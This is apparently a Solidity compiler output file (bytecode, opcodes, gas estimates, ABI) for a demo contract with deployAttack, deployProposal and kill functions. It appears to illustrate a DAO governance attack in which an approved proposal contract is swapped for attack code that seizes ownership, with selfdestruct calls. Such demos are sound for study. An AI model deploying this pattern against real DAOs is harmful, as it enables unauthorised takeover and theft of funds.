{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b506105d8806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806341c0e1b5146100465780637a19ebe614610050578063a9cfd2ee1461005a575b600080fd5b61004e610064565b005b61005861007e565b005b6100626100e5565b005b600073ffffffffffffffffffffffffffffffffffffffff16ff5b600060405161008c9061014c565b604051809103906000f0801580156100a8573d6000803e3d6000fd5b5090507fb8a00d6d8ca1be30bfec34d8f97e55f0f0fd9eeb7fb46e030516363d4cfe1ad6816040516100da91906101a7565b60405180910390a150565b60006040516100f390610159565b604051809103906000f08015801561010f573d6000803e3d6000fd5b5090507fb8a00d6d8ca1be30bfec34d8f97e55f0f0fd9eeb7fb46e030516363d4cfe1ad68160405161014191906101a7565b60405180910390a150565b61026d806101c383390190565b6101738061043083390190565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061019182610166565b9050919050565b6101a181610186565b82525050565b60006020820190506101bc6000830184610198565b9291505056fe6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561005057600080fd5b5061020d806100606000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063373058b81461003b5780638da5cb5b14610045575b600080fd5b610043610063565b005b61004d6100da565b60405161005a919061013f565b60405180910390f35b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051610090906101b7565b60405180910390a1336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610129826100fe565b9050919050565b6101398161011e565b82525050565b60006020820190506101546000830184610130565b92915050565b600082825260208201905092915050565b7f4578637574656420636f6465204e4f5420617070726f7665642062792044414f600082015250565b60006101a160208361015a565b91506101ac8261016b565b602082019050919050565b600060208201905081810360008301526101d081610194565b905091905056fea264697066735822122057585f2e79436c84b67a3833bcb409982e60e855f22e2bddccf62b97b165412864736f6c63430008120033608060405234801561001057600080fd5b50610153806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063373058b81461003b57806363a599a414610045575b600080fd5b61004361004f565b005b61004d610086565b005b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab60405161007c906100fd565b60405180910390a1565b600073ffffffffffffffffffffffffffffffffffffffff16ff5b600082825260208201905092915050565b7f4578637574656420636f646520617070726f7665642062792044414f00000000600082015250565b60006100e7601c836100a0565b91506100f2826100b1565b602082019050919050565b60006020820190508181036000830152610116816100da565b905091905056fea26469706673582212206db2aeb876a8d8813cfc7df8bfe10aeed53c80d31c181241be4489e2ab2fa7f964736f6c63430008120033a2646970667358221220ad43a47fa60c6e92a431f3c072439c48b1f7a10906c71cd37280b02f615418f664736f6c63430008120033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5D8 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x41C0E1B5 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x7A19EBE6 EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xA9CFD2EE EQ PUSH2 0x5A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x64 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x58 PUSH2 0x7E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x62 PUSH2 0xE5 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD PUSH2 0x8C SWAP1 PUSH2 0x14C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0xA8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP SWAP1 POP PUSH32 0xB8A00D6D8CA1BE30BFEC34D8F97E55F0F0FD9EEB7FB46E030516363D4CFE1AD6 DUP2 PUSH1 0x40 MLOAD PUSH2 0xDA SWAP2 SWAP1 PUSH2 0x1A7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD PUSH2 0xF3 SWAP1 PUSH2 0x159 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x10F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP SWAP1 POP PUSH32 0xB8A00D6D8CA1BE30BFEC34D8F97E55F0F0FD9EEB7FB46E030516363D4CFE1AD6 DUP2 PUSH1 0x40 MLOAD PUSH2 0x141 SWAP2 SWAP1 PUSH2 0x1A7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP JUMP JUMPDEST PUSH2 0x26D DUP1 PUSH2 0x1C3 DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH2 0x173 DUP1 PUSH2 0x430 DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x191 DUP3 PUSH2 0x166 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1A1 DUP2 PUSH2 0x186 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1BC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x198 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x20D DUP1 PUSH2 0x60 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x373058B8 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0xDA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5A SWAP2 SWAP1 PUSH2 0x13F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x90 SWAP1 PUSH2 0x1B7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x129 DUP3 PUSH2 0xFE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x139 DUP2 PUSH2 0x11E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x154 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x130 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4578637574656420636F6465204E4F5420617070726F7665642062792044414F PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A1 PUSH1 0x20 DUP4 PUSH2 0x15A JUMP JUMPDEST SWAP2 POP PUSH2 0x1AC DUP3 PUSH2 0x16B JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1D0 DUP2 PUSH2 0x194 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 JUMPI PC 0x5F 0x2E PUSH26 0x436C84B67A3833BCB409982E60E855F22E2BDDCCF62B97B16541 0x28 PUSH5 0x736F6C6343 STOP ADDMOD SLT STOP CALLER PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x153 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x373058B8 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x63A599A4 EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x4F JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0x86 JUMP JUMPDEST STOP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x7C SWAP1 PUSH2 0xFD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4578637574656420636F646520617070726F7665642062792044414F00000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE7 PUSH1 0x1C DUP4 PUSH2 0xA0 JUMP JUMPDEST SWAP2 POP PUSH2 0xF2 DUP3 PUSH2 0xB1 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x116 DUP2 PUSH2 0xDA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH14 0xB2AEB876A8D8813CFC7DF8BFE10A 0xEE 0xD5 EXTCODECOPY DUP1 0xD3 SHR XOR SLT COINBASE 0xBE PREVRANDAO DUP10 0xE2 0xAB 0x2F 0xA7 0xF9 PUSH5 0x736F6C6343 STOP ADDMOD SLT STOP CALLER LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xAD NUMBER LOG4 PUSH32 0xA60C6E92A431F3C072439C48B1F7A10906C71CD37280B02F615418F664736F6C PUSH4 0x43000812 STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "299200",
				"executionCost": "337",
				"totalCost": "299537"
			},
			"external": {
				"deployAttack()": "infinite",
				"deployProposal()": "infinite",
				"kill()": "27722"
			}
		},
		"methodIdentifiers": {
			"deployAttack()": "7a19ebe6",
			"deployProposal()": "a9cfd2ee",
			"kill()": "41c0e1b5"
		}
	},
	"abi": [
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "address",
					"name": "addr",
					"type": "address"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "deployAttack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "deployProposal",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "kill",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}